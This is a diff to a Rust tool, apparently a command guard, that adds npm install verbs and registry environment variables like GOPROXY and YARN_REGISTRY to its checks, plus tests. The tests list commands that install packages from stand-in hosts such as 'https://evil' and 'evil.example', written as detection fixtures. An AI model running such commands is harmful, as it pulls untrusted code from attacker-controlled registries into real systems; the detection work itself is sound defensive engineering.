@@ -1376,12 +1376,24 @@ const NPM_INSTALL: &[&str] = &[
     "it",
 ];
 
-/// npm's `ci` spellings: they name no package but can still use another registry.
-const NPM_CLEAN_INSTALL: &[&str] = &["ci", "clean-install", "ic", "install-clean", "isntall-clean"];
+/// npm's other install-family verbs (`ci` and its spellings, `cit`, `update`):
+/// checked like `install`, mainly so another registry needs approval.
+const NPM_CLEAN_INSTALL: &[&str] = &[
+    "ci",
+    "clean-install",
+    "ic",
+    "install-clean",
+    "isntall-clean",
+    "cit",
+    "clean-install-test",
+    "update",
+    "up",
+    "upgrade",
+];
 
 /// Environment variables that point a package manager at another index or
 /// registry (`PIP_INDEX_URL=… pip install x`); matched case-insensitively.
-const REGISTRY_ENV: [&str; 9] = [
+const REGISTRY_ENV: [&str; 11] = [
     "PIP_INDEX_URL",
     "PIP_EXTRA_INDEX_URL",
     "PIP_FIND_LINKS",
@@ -1391,6 +1403,8 @@ const REGISTRY_ENV: [&str; 9] = [
     "UV_INDEX",
     "UV_DEFAULT_INDEX",
     "YARN_NPM_REGISTRY_SERVER",
+    "YARN_REGISTRY",
+    "GOPROXY",
 ];
 
 /// Options whose (space-separated) value says where requirements are read from.
@@ -1441,6 +1455,20 @@ fn find_verb(ws: &[Word], is_verb: impl Fn(&str) -> bool) -> Option<usize> {
         }
     }
     None
+}
+
+/// `ws` holds only options and the words right after them (their values).
+fn only_options(ws: &[Word]) -> bool {
+    let mut after_option = false;
+    ws.iter().all(|w| {
+        let t = w.text.as_str();
+        if t.len() > 1 && t.starts_with('-') {
+            after_option = !t.contains('=');
+            true
+        } else {
+            std::mem::take(&mut after_option)
+        }
+    })
 }
 
 /// How one install/run form reads its arguments.
@@ -1572,15 +1600,7 @@ fn install_spec(manager: &str, verb: &str) -> Option<InstallSpec> {
 fn parse_install(name: &str, args: &[Word]) -> Option<Install> {
     let (manager, args) = package_manager(name, args)?;
     let verbs: &[&str] = match manager {
-        "npm" => &[
-            "exec",
-            "x",
-            "ci",
-            "clean-install",
-            "ic",
-            "install-clean",
-            "isntall-clean",
-        ],
+        "npm" => &["exec", "x"],
         "pnpm" => &["install", "i", "add", "dlx"],
         "yarn" => &["install", "add", "global", "dlx"],
         "bun" => &["install", "i", "add", "x"],
@@ -1594,10 +1614,16 @@ fn parse_install(name: &str, args: &[Word]) -> Option<Install> {
     let (verb, mut rest) = if verbs.is_empty() {
         ("", args)
     } else {
-        let k = find_verb(args, |t| {
-            verbs.contains(&t) || (manager == "npm" && NPM_INSTALL.contains(&t))
-        })?;
-        (args[k].text.as_str(), &args[k + 1..])
+        let is_verb = |t: &str| {
+            verbs.contains(&t)
+                || (manager == "npm" && (NPM_INSTALL.contains(&t) || NPM_CLEAN_INSTALL.contains(&t)))
+        };
+        match find_verb(args, is_verb) {
+            Some(k) => (args[k].text.as_str(), &args[k + 1..]),
+            // A bare `yarn [options]` installs.
+            None if manager == "yarn" && only_options(args) => ("install", args),
+            None => return None,
+        }
     };
     // Two-word verbs: `yarn global add`, `uv pip install`, `uv tool run`.
     let verb = match (manager, verb) {
@@ -3082,6 +3108,12 @@ mod tests {
                 "env PIP_INDEX_URL=https://evil pip install requests",
                 "PIP_INDEX_URL",
             ),
+            ("YARN_REGISTRY=https://evil yarn add x", "YARN_REGISTRY"),
+            ("GOPROXY=https://evil go get example.com/x", "GOPROXY"),
+            ("yarn --registry https://evil.example", "registry"),
+            ("npm cit --registry https://evil.example", "registry"),
+            ("npm update --registry https://evil.example", "registry"),
+            ("npm up --registry https://evil.example", "registry"),
             ("pip install -r/dev/stdin", "run time"),
             ("pip install -rhttps://evil/r.txt", "run time"),
             ("pip install -c- requests", "run time"),
